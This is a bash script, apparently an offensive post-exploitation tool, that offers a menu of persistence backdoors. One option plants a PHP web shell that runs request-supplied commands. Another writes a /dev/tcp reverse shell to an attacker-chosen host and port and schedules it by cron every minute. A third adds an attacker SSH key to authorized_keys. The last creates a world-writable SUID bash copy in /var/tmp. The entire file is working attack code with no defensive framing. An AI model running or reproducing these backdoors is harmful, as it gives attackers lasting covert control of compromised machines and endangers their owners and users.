#!/bin/bash
trap 'echo -e "\nUSER INTERRUPTED! EXITING..."; exit 1' SIGINT
if [[ $SHELL != "/bin/bash" ]]; then
  echo -e "\nRun this script in bash shell..."
  exit 1
fi
while true; do
  cat <<EOF
[+] PERSISTENCE [+]

[1] Web shell spawner
[2] Cron backdoor spawner 
[3] SSH backdoor spawner 
[4] SUID bash spawner [+]root privilege required
[5] Exit 
EOF
  read -r -p "Choose an option: " option
  case "$option" in
  1)
    read -r -p "Type web root path: " web_root
    if [[ ! -d "$web_root" ]]; then
      echo "[-]Web root directory doesn't exist..."
      read -r
      continue
    fi
    if echo '<?php if(isset($_REQUEST["cmd"])){ echo "<pre>"; $cmd = ($_REQUEST["cmd"]); system($cmd); echo "</pre>"; die; }?>' >"$web_root/shell.php"; then
      echo "[+]Web shell has successfully created..."
      read -r
    else
      echo "[-]Web shell has failed to create..."
      read -r
    fi
    ;;
  2)
    read -r -p "Set your lhost: " lhost
    read -r -p "Set you lport: " lport
    if [[ -z $lhost || -z $lport ]]; then
      echo "[-]Lhost and Lport can not be empty..."
      read -r
      continue
    fi
    if echo "sh -i >& /dev/tcp/$lhost/$lport 0>&1" >/tmp/shell.sh; then
      (
        crontab -l 2>/dev/null
        echo "* * * * * /bin/bash /tmp/shell.sh"
      ) | crontab -
      echo "[+]Cron backdoor has successfully created..."
      read -r
    else
      echo "[-]Cron backdoor has failed to create..."
      read -r
    fi
    ;;
  3)
    read -r -p "Set your ssh public key: " ssh_pub
    if [[ -z $ssh_pub ]]; then
      echo "[-]SSH key can not be empty..."
      read -r
      continue
    fi
    mkdir -p "$HOME/.ssh"
    if echo "$ssh_pub" >>"$HOME/.ssh/authorized_keys"; then
      echo "[+]SSH backdoor has successfully created..."
      read -r
    else
      echo "[-]SSH backdoor has failed to create..."
      read -r
    fi
    ;;
  4)
    echo "[+]Creating SUID bash..."
    cp /bin/bash /var/tmp/root_bash
    chmod 777 /var/tmp/root_bash
    if chmod +s /var/tmp/root_bash; then
      echo "[+]SUID bash has successfully created..."
      echo "[+]SUID bash path: /var/tmp/root_bash"
      read -r
    else
      echo "[-]SUID bash has failed to create..."
      read -r
    fi
    ;;
  5)
    echo "[-]Goodbye..."
    exit 0
    ;;
  *)
    echo "[-]Invalid option..."
    read -r
    ;;
  esac
done
